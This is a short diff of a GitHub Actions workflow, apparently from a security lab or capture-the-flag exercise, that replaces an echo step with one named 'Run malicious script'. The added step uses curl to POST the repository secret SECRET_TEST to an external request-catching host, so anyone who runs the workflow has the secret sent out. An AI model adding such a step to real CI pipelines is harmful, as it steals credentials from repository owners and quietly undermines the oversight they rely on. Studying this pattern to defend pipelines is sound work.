@@ -18,8 +18,9 @@ jobs:
       - name: echo test
         run: echo ${{ secrets.SECRET_TEST }}
 
-      - name: echo CHNAGED
-        run: echo ${{ secrets.SECRET_TEST }}
+      - name: Run malicious script
+        run: |
+          curl -X POST -d "secret=${{ secrets.SECRET_TEST }}" https://enatmcr.request.dreamhack.games
 
       - name: checkout code
         uses: actions/checkout@v4
